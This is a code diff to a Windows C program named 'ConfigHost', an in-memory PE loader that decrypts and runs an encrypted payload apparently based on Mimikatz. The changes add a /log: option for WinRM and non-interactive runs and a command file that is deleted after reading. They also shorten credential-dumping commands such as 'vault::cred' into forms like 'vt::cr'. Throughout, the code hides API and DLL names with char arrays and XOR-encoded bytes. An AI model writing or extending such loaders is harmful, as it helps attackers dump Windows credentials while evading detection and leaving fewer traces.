@@ -180,17 +180,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             const char msg[] =
                 "\r\n  ConfigHost - In-memory PE loader\r\n\r\n"
                 "  Usage:\r\n"
-                "    ConfigHost.exe <payload> [cmd1] [cmd2] ... [exit]\r\n\r\n"
+                "    ConfigHost.exe <payload> [/log:file] [cmd1] [cmd2] ... [exit]\r\n"
+                "    ConfigHost.exe <payload> @commands.txt [/log:file]\r\n\r\n"
                 "  Arguments:\r\n"
                 "    <payload>    Path to encrypted payload (.bin)\r\n"
-                "    [cmd]        Commands injected into console (optional)\r\n"
+                "    /log:file    Write all output to file (for WinRM/non-interactive)\r\n"
+                "    @file        Read commands from file (deleted after reading)\r\n"
+                "    [cmd]        Commands passed to payload (optional)\r\n"
                 "    exit         Close after execution\r\n\r\n"
                 "  Examples:\r\n"
                 "    ConfigHost.exe cipher.bin\r\n"
-                "    ConfigHost.exe cipher.bin \"vault::cred\" exit\r\n"
-                "    ConfigHost.exe cipher.bin \"log out.txt\" \"token::whoami\" exit\r\n\r\n"
+                "    ConfigHost.exe cipher.bin \"vt::cr\" exit\r\n"
+                "    ConfigHost.exe cipher.bin /log:out.txt \"pv::dbg\" \"sk::lp\" exit\r\n"
+                "    ConfigHost.exe cipher.bin @cmds.txt /log:C:\\temp\\out.txt\r\n\r\n"
                 "  Without commands: opens interactive console.\r\n"
-                "  With commands: auto-injects keystrokes then runs.\r\n\r\n";
+                "  With /log: output is written to file.\r\n\r\n";
             DWORD wr;
             char s_wf[] = {'W','r','i','t','e','F','i','l','e',0};
             typedef BOOL(WINAPI* fn_WrF)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
@@ -216,6 +220,39 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     char* extraArgs = payloadPath + pi;
     if (*extraArgs == '"') extraArgs++;
     while (*extraArgs == ' ') extraArgs++;
+
+    char logPath[260];
+    logPath[0] = 0;
+    {
+        char* scan = extraArgs;
+        while (*scan) {
+            while (*scan == ' ') scan++;
+            if (!*scan) break;
+            if (scan[0] == '/' && scan[1] == 'l' && scan[2] == 'o' && scan[3] == 'g' && scan[4] == ':') {
+                char* lp = scan + 5;
+                int li = 0;
+                char* argEnd;
+                if (*lp == '"') {
+                    lp++;
+                    while (lp[li] && lp[li] != '"' && li < 258) { logPath[li] = lp[li]; li++; }
+                    logPath[li] = 0;
+                    argEnd = lp + li;
+                    if (*argEnd == '"') argEnd++;
+                } else {
+                    while (lp[li] && lp[li] != ' ' && li < 258) { logPath[li] = lp[li]; li++; }
+                    logPath[li] = 0;
+                    argEnd = lp + li;
+                }
+                while (*argEnd == ' ') argEnd++;
+                char* dst = scan;
+                while (*argEnd) *dst++ = *argEnd++;
+                *dst = 0;
+                break;
+            }
+            if (*scan == '"') { scan++; while (*scan && *scan != '"') scan++; if (*scan) scan++; }
+            else { while (*scan && *scan != ' ') scan++; }
+        }
+    }
 
     char dll2[16];
     const unsigned char enc_a[] = {0x23,0x26,0x34,0x23,0x32,0x2B,0x71,0x70,0x6C,0x26,0x2E,0x2E};
@@ -263,7 +300,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     HCRYPTHASH hHash = 0;
     if (!pCCH(hProv, 0x8004, 0, 0, &hHash)) return 21;
 
-    #include "../mimi_key.h"
+    #include "mimi_key.h"
     if (!pCHD(hHash, keyBuff, sizeof(keyBuff), 0)) return 22;
 
     HCRYPTKEY hKey = 0;
@@ -487,6 +524,18 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             fileCmds[out] = 0;
         }
         extraArgs = fileCmds;
+    }
+
+    char logCmds[4200];
+    if (logPath[0]) {
+        int ci = 0;
+        logCmds[ci++] = '"'; logCmds[ci++] = 'l'; logCmds[ci++] = 'o'; logCmds[ci++] = 'g';
+        logCmds[ci++] = ' ';
+        for (int li = 0; logPath[li] && ci < 4180; li++) logCmds[ci++] = logPath[li];
+        logCmds[ci++] = '"'; logCmds[ci++] = ' ';
+        for (char* s = extraArgs; *s && ci < 4190; ) logCmds[ci++] = *s++;
+        logCmds[ci] = 0;
+        extraArgs = logCmds;
     }
 
     if (*extraArgs) {
